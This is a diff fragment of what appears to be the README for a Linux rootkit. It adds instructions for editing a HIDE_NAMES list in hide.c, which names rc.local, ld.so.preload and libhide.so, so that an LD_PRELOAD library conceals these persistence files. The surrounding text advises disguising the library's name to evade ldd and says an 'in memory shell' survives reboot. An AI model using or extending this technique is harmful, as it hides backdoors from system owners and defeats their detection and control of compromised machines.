@@ -27,4 +27,15 @@ I should note, this will be noticable using ldd:
 
 So chosing a more uniform and harmless name for this file should be advised. 
 
+Should you need to add or update the filenames that are hidden, you may edit this struct in the hide.c 
+and recompile it:
+
+// List of files to hide
+static const char *HIDE_NAMES[] = {
+    "rc.local",
+    "ld.so.preload",
+    "libhide.so",
+    NULL // Sentinel
+};
+
 Now even if the Linux device is rebooted, our in memory shell should survive.
